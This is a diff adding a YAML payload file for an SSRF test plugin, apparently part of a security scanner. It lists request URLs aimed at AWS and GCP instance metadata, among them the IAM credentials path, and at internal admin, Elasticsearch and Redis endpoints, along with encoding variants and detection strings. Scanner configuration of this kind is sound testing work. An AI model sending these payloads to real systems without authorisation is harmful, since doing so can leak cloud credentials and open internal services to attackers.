@@ -1,0 +1,74 @@
+# SSRF Payloads Database
+# Plugin: core.information_flow.ssrf
+
+plugin_id: core.information_flow.ssrf
+mutation_type: field_injection
+payload_type: ssrf
+
+variants:
+  # Variant 1: AWS metadata
+  - id: aws_metadata
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://169.254.169.254/latest/user-data/"
+    tech_stack: []
+    confidence_boost: 0.30
+    detection: body_matches_any(ami-id, instance-id, iam, credentials)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [unicode_escape]
+      obfuscation: []
+      max_combinations: 6
+
+  # Variant 2: GCP metadata
+  - id: gcp_metadata
+    payloads:
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://metadata/computeMetadata/v1/instance/"
+      - "http://169.254.169.254/computeMetadata/v1/"
+    tech_stack: []
+    confidence_boost: 0.28
+    detection: body_matches_any(instance, project-id, gce)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 3: Internal services
+  - id: internal_services
+    payloads:
+      - "http://localhost:8080/admin"
+      - "http://127.0.0.1:9200/_cluster/health"
+      - "http://[::1]:6379/"
+    tech_stack: []
+    confidence_boost: 0.22
+    detection: body_matches_any(admin, elastic, redis, internal)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+keywords:
+  - url
+  - link
+  - href
+  - src
+  - redirect
+  - callback
+  - webhook
+  - fetch
+
+expected_results:
+  aws_metadata:
+    indicator: ssrf_metadata
+    expected_output: "ami-id"
+  gcp_metadata:
+    indicator: ssrf_metadata
+    expected_output: "instance"
+  internal_services:
+    indicator: ssrf_internal
+    expected_output: "admin"
